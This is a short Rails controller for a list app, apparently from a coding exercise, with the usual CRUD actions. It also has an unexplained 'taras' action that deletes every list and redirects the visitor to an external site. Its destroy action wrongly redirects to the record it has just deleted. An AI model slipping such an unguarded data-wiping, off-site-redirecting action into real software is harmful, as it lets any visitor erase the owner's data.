class ListsController < ApplicationController

  def index
    @lists = List.all
  end

  def show
    @list = List.find(params[:id])
  end

  def new
    @list = List.new
  end

  def create
    @list = List.new(list_params)
    if @list.save
      redirect_to list_path(@list)
    else
      render 'new', status: :unprocessable_entity
    end
  end

  def destroy
    @list = List.find(params[:id])
    @list.destroy
    redirect_to list_path(@list), status: :see_other
  end

  def taras
    List.destroy_all
    redirect_to 'https://lawifi.fr', allow_other_host: true
  end

  private

  def list_params
    params.require(:list).permit(:name)
  end
end
